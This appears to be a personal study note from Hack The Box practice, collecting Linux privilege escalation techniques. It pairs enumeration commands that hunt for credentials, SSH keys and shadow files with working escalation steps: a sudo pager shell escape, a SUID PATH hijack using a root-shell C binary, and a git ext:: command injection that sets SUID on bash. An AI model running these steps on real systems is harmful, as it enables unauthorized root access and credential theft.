# Privilege Escalation - Common Library

This is a PrivEsc common library, that gathers all generic techniques (and not so generic) I've gathered and that I will gather throughout my journey on HTB. It'll be divided in different sections:

- [[Privilege Escalation - Common Library#Enumeration|Enumeration]]: Commands you should run in all machines
    - [[Privilege Escalation - Common Library#Who am I? What permissions do I have?|Who am I? What permissions do I have?]]
    - [[Privilege Escalation - Common Library#What is (in) the system? Who else is in the system?|What is (in) the system? Who else is in the system?]]
    - [[Privilege Escalation - Common Library#What is listening? What is running?|What is listening? What is running?]]
    - [[Privilege Escalation - Common Library#Extended permission checking|Extended permission checking]]
    - [[Privilege Escalation - Common Library#Sensitive files & credentials|Sensitive files & credentials]]
    - [[Privilege Escalation - Common Library#Capabilities|Capabilities]]
      
- [[Privilege Escalation - Common Library#Exploitation|Exploitation]]: I found X, here's how to abuse it
    - [[Privilege Escalation - Common Library#Sudo pager escape|Sudo pager escape]]
    - [[Privilege Escalation - Common Library#PATH hijack (SUID binary)|PATH hijack (SUID binary)]]
    - [[Privilege Escalation - Common Library#Git ext:: abuse|Git ext:: abuse]]

---

## Enumeration

> Run these on every machine, no matter what. They paint the full picture before you go deep.

---

### Who am I? What permissions do I have?

| Command   | Description                                                       |
| --------- | ----------------------------------------------------------------- |
| `whoami`  | Prints your current username                                      |
| `id`      | Shows user ID (uid), group ID (gid), and all the groups you're in |
| `sudo -l` | What can I run as sudo?                                           |
| `env`     | Shows environment variables — look for credentials, paths, tokens |
| `groups`  | Shows all groups the current user belongs to.                     |

**Writable files hunt:**

```bash
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

Finds regular files writable by the current user, excluding `/proc` and `/sys` (virtual filesystems).

- `-writable` = match writable files, `-type f` = regular files only (not directories), `2>/dev/null` = discard errors, `grep -v` = exclude lines containing that pattern

---

### What is (in) the system? Who else is in the system?

| Command               | Description                                                                              |
| --------------------- | ---------------------------------------------------------------------------------------- |
| `uname -a`            | Prints system information: kernel version, architecture (x86/x64/ARM)                    |
| `cat /etc/os-release` | Distribution name and version (Ubuntu, Debian, etc.)                                     |
| `ls -la /home/`       | Lists all folders (and thus users) in /home. `-l` = long listing (perms etc), `-a` = all |

**Users with a shell:**

```bash
cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
```

Shows which users have a `/bin/bash` or `/bin/sh`.

- In `grep -E`, `-E` = extended regex, which allows alternation `(|)`. So it greps for `/bin/bash` or `/bin/sh`

**Recently modified files (last 10 min):**

```bash
find / -type f -mmin -10 2>/dev/null | grep -v proc | grep -v sys
```

Useful for spotting freshly written scripts, configs, or credentials — e.g. a cronjob just ran and wrote something.

- `-type f` = regular files only, `-mmin -10` = modified less than 10 minutes ago, `2>/dev/null` = hide errors, `| grep -v proc | grep -v sys` = pipe the results and exclude `/proc` and `/sys` (virtual filesystems that would flood the output with noise)

---

### What is listening? What is running?

**Running processes:**

```bash
ps aux
ps aux | grep root      # filter for root-owned processes only
```

- `a` = show processes from all users, `u` = show the user who owns each process, `x` = include processes not attached to a terminal (background stuff)

**Scheduled tasks:**

```bash
cat /etc/crontab                           # system-wide crontab
ls -la /etc/cron*                          # all cron directories (daily, weekly...)
cat /var/spool/cron/crontabs/* 2>/dev/null # per-user crontabs
```

**Open ports & listeners:**

```bash
netstat -tulpn 2>/dev/null
ss -tulpn 2>/dev/null        # modern alternative to netstat, same flags
```

Shows listening TCP/UDP ports, program name, and PID. Useful to spot internal services that aren't exposed externally.

- `-t` = TCP, `-u` = UDP, `-l` = listening only, `-p` = show process name/PID, `-n` = numeric (skip DNS resolution, faster)

---

### Extended permission checking

**SUID binaries** (run with the _owner's_ privileges — often root):

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `-perm -4000` = SUID bit set, `-type f` = regular files, `2>/dev/null` = hide errors
- Cross-reference findings on [GTFOBins](https://gtfobins.github.io/)

**SGID binaries** (run with the _group's_ privileges):

```bash
find / -perm -2000 -type f 2>/dev/null
```

- `-perm -2000` = SGID bit set, `-type f` = regular files, `2>/dev/null` = hide errors

**World-writable directories** (potential hijack spots):

```bash
find / -type d -perm -0002 2>/dev/null | grep -v proc
```

- `-type d` = directories only, `-perm -0002` = writable by anyone (the last `2` in the octal = "others can write")

**Files owned by root but writable by others:**

```bash
find / -user root -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

- `-user root` = owned by root, `-writable` = but still writable by you. That's a misconfiguration you can abuse.

---

### Sensitive files & credentials

> Always check these — hardcoded creds and keys are embarrassingly common.

---

**System files:**

- `cat /etc/shadow` -> Hashed passwords. Needs root or shadow group to read, but worth trying.

---

**Shell history** (people type passwords in plaintext more than you'd think):

```bash
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history 2>/dev/null
```

---

**Config files that often leak creds:**

```bash
find / -name "*.env" 2>/dev/null          # hardcoded DB passwords, API keys, etc.
find / -name "wp-config.php" 2>/dev/null  # WordPress config, almost always has DB creds in plaintext
find / -name "config.php" 2>/dev/null
```

- `-name` = match by filename, supports wildcards like `*.env` (any file ending in `.env`)

---

**SSH keys:**

```bash
find / -name "id_rsa" 2>/dev/null         # private RSA key — jackpot if found
find / -name "id_ed25519" 2>/dev/null     # same but Ed25519 (newer key type)
cat ~/.ssh/authorized_keys                # shows who can log in as this user via SSH
```

---

### Capabilities

> Capabilities are like a more granular SUID — instead of giving a binary full root, they give it just one specific privilege. Often overlooked, often misconfigured.

---

```bash
getcap -r / 2>/dev/null
```

Lists all binaries with special Linux capabilities set.

- `-r` = recursive (search from `/`), `2>/dev/null` = hide errors

**Things to look for in the output:**

- `cap_setuid` -> can change its own UID -> effectively root
- `cap_dac_override` -> bypass file read/write permissions
- `cap_net_raw` -> raw sockets (can sniff traffic)

Cross-reference findings on [GTFOBins](https://gtfobins.github.io/) under the _Capabilities_ filter.

---
## Exploitation

> You found something. Here's how to abuse it.

---
### Sudo pager escape
> A pager is a program that displays long output one screen at a time, letting you scroll through it — think of it as a "reader" for terminal output. The most common one is `less`. The dangerous thing about pagers is that `less` lets you run shell commands from inside it by typing `!command`.

If `sudo -l` shows you can run any of these as sudo, you can escape into a root shell:

```bash
sudo systemctl status <service>
sudo journalctl
sudo man <anything>
sudo git log
sudo git diff
sudo git show
```

All of these open their output in `less` by default. Once inside, type:

```bash
!/bin/bash
```

And you drop into a root shell. That's it.

**Why it works:**

- The command runs as root via sudo
- It opens `less` as root to display the output
- `less` inherits root privileges
- `!command` in less executes a shell command — as root

**Real example ([[Sau]]):**

```bash
sudo /usr/bin/systemctl status trail.service
# inside less:
!/bin/bash
whoami  # root
```

---
### PATH hijack (SUID binary)

> If a SUID binary calls another program by name (not full path), you can create a malicious binary with that name earlier in PATH and make the SUID binary execute it as root instead.

**Conditions needed:**
- A SUID binary that calls a program by name without full path
- A writable directory you can prepend to PATH

**Steps:**
1. Identify the SUID binary and what it calls (use `strings` or `ltrace`)
2. Create a malicious binary with that name in a writable directory
3. Prepend that directory to PATH
4. Run the SUID binary — it executes your binary as root

**The malicious binary must be a compiled ELF**, not a shell script — Linux ignores SUID on scripts. Use C:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc -static ./evil.c -o ./targetbinary
export PATH=/your/writable/dir:$PATH
./suid-binary
whoami  # root
```

**Real example ([[Editor]]):**

- `ndsudo` called `nvme` by name without full path
- Created malicious `nvme` binary in `/tmp`, prepended `/tmp` to PATH
- `ndsudo nvme-list` executed our binary as root

---

### Git ext:: abuse

> If you can run a script as sudo that uses GitPython's `clone_from()` with `protocol.ext.allow=always`, you can pass an `ext::` URL to make git execute an arbitrary command as root before the clone fails.

**Conditions needed:**
- Sudo rights to a script that calls `git clone` or GitPython's `clone_from()`
- The script passes `-c protocol.ext.allow=always`
- User input goes directly into the URL with no sanitization

**Steps:**
1. Write your payload to a script:

```bash
echo 'chmod +s /bin/bash' > /tmp/pwn.sh
chmod +x /tmp/pwn.sh
```

2. Pass it as an `ext::` URL:
```bash
sudo /path/to/script.py 'ext::sh -c /tmp/pwn.sh'
```

3. Git runs your script as root, errors out (expected), then:
```bash
/bin/bash -p
whoami  # root
```

**Why it errors:** Git runs your command as the transport, expects git protocol back, gets nothing, and panics. The error is a red herring — your command already ran.

**Real example ([[Editorial]]):**

- `clone_prod_change.py` used GitPython with `protocol.ext.allow=always`
- Passed `ext::sh -c /tmp/pwn.sh` as the URL
- Script chmodded `/bin/bash` as root